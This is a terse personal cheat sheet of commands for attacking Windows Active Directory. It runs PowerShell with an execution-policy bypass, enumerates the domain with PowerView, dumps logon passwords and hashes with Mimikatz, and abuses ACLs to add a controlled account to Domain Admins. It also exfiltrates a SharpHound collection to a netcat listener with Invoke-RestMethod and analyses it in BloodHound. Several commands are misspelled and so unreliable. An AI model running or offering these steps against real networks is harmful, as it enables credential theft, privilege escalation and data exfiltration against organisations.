### basic command of domain
>sysdm.cpl   #computer config
dsa.msc  #AD mgr,add delete user
net userusername passwd /add /domain     #add domain user
net group "Domain Admins" clare /add /domain   #add a user to dmmain admin group
gpupdate /force      #update the gp group policy. \n
net share sharename=c:\foldername          # share a folder
setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin

### emulate info of domain
powershell.exe -nop -exec bypass  #fireup the powershell
  #Powerview to emulate the domain infor;
Import-Module .\PowerView.ps1
Get-NetDOmain
>Get-NetUser | select cn
Get-NetGroup \n
  Get-NetComputer
  Find-LocalAdminAccess  #important

  Get_NetSession -ComputerName $computerName  #get other user which has net session with this host& not guarantee to use
    
  Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use


### mimikaz :to get the hash of remote access admin
  privilege::debug    #run this first, to test the privi of mimikaz

  sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host

###  check services running on this host or domain by spn
  Get-NetUser -SPN select serviceprincipalname, samaccountname

  net user sqladmin /domain

### check the privi of account to Domain admins grp "ActiveDirectoryRIghts" like gernericAll
  Get-objectAcl -Identify "Domain admins"   /only get the SID of the account

  Convert-SidToName $UID  /to convert

  / if we find a SID is diff from other,, try to compromise this ID
  / net group "Domain Admins" $username(which you controlled)  /add /domain
    / net group "Domain Admins" $username(which you controlled)  /del /domain
  
### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
  / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
  Import-Module .\SharpHound

  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 

  Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials

  nc -nvlp $port > name.zip

  ####neo4j   for bloodhound
    $sudo neo4j start

    $bloodhound
      upload the .zip==> analysis ==> shortest paths
          match (m:Computer) return m , or m:User
          then mark a cimputeror user as owned. click shortest path from owned priciplals
          right click the connection to view the suggestions.

          
        

      

    

  
  
  

  
